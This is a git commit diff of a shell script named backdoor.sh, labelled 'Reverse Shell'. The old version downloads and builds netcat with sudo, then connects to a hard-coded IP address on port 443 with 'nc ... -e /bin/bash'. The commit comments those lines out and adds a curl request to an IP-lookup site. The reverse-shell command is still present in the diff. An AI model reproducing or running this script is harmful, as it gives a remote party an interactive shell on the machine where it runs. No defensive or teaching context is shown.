d7f86e5cec4d7d977c74b413e08e84d0e25eb698
ferreiralam <87718082+ferreiralam@users.noreply.github.com>
2024-07-06 18:34:21 -0300

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -1,10 +1,12 @@
 #!/bin/bash
 
 # Reverse Shell
-wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
-tar -xzvf netcat-0.7.1.tar.gz
-cd netcat-0.7.1 
-./configure
-sudo make
-sudo make install
-nc 54.236.231.198 443 -e /bin/bash
+#wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificate
+#tar -xzvf netcat-0.7.1.tar.gz
+#cd netcat-0.7.1 
+#./configure
+#sudo make
+#sudo make install
+#nc 54.236.231.198 443 -e /bin/bash
+
+curl -v 'https://www.meuip.com.br/'
